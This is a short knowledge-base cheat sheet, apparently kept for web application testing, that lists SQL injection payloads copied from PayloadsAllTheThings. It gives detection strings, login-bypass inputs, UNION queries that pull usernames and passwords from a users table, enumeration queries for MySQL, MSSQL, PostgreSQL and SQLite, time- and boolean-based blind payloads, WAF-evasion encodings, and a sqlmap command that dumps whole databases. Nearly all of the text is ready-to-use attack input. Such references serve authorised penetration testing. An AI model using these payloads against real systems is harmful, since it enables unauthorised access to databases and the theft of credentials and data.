---
summary: SQL injection payloads — detection, auth bypass, UNION, per-DB enum, blind, WAF bypass.
status: active
tags: [security, payloads, sqli, web]
private: false
---

# SQL Injection Payloads

Source: [PayloadsAllTheThings/SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection). Automate confirmed injections with `sqlmap -u '<url>' --batch --dump`.

## Detect

```
'    "    ;    )    *          # break the query, watch for errors/behavior change
' OR '1'='1
' OR 1=1 -- -                  # note trailing space after --
```

## Auth bypass

```
' OR '1'='1'-- -
' or 1=1 limit 1 -- -
admin' -- -
admin'#
' OR 'x'='x
```

## UNION-based

```
' ORDER BY 1-- -               # increment until error = column count
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -    # match column count
' UNION SELECT username,password FROM users-- -
' UNION SELECT table_name,NULL FROM information_schema.tables-- -
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

## Comment styles

```
-- -     #     /**/     /*!12345 inline */
```

## Version / enumeration

- **MySQL**: `SELECT @@version` · `information_schema.tables` / `.columns`
- **MSSQL**: `SELECT @@version` · `SELECT name FROM sys.tables`
- **PostgreSQL**: `SELECT version()` · `information_schema.tables`
- **SQLite**: `sqlite_version()` · `SELECT name FROM sqlite_master`

## Blind — time-based

```
' AND SLEEP(5)-- -                         # MySQL
'; WAITFOR DELAY '0:0:5'-- -               # MSSQL
' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -    # PostgreSQL
```

## Blind — boolean

```
' AND 1=1-- -            # true page
' AND 1=2-- -            # false page (diff = injectable)
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64-- -
```

## WAF bypass

```
/**/UNION/**/SELECT       # comments for spaces
%09 %0a %0d               # whitespace variants
UnIoN SeLeCt              # case
(1)and(1)=(1)             # parens instead of spaces
0x61646d696e             # hex-encode strings
```

## Related

- [Payload Cheat Sheets — Index](kb://11-security-payloads-payloads-index)
- [Web Application Testing](kb://11-security-playbook-web-app-testing)
